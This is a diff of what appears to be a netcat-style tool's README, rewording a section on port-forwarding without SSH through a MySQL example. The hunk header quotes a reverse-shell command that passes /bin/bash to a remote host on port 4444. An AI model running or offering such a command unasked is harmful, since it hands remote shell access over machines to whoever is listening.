@@ -72,9 +72,10 @@ pwncat -e '/bin/bash' example.com 4444
 ```
 #### Port-forwarding without SSH
 
-See here to un-brainfuck: https://www.everythingcli.org/ssh-tunnelling-for-fun-and-profit-local-vs-remote/. Using the same examples to make it more clear.
+See here to un-brainfuck: https://www.everythingcli.org/ssh-tunnelling-for-fun-and-profit-local-vs-remote/<br/>
+(Using the same examples to make it more clear)
 
-The only difference to SSH port-forwarding as shown in the blog is that in their case, the MySQL server is only available on localhost on the remote server.
+The only difference to SSH port-forwarding shown in the blog, is that in their case, the MySQL server is only available on localhost on the remote server.
 SSH portfowarding is exactly for this case, as it SSH's into the machine and can reach their local port.
 In the example here, we cannot SSH into the server, so we can only forward/proxy something which is externally available.
 That's why we just assume the MySQL server is listening publically on everythingcli.org (i.e, their port 3306 is externally available.)
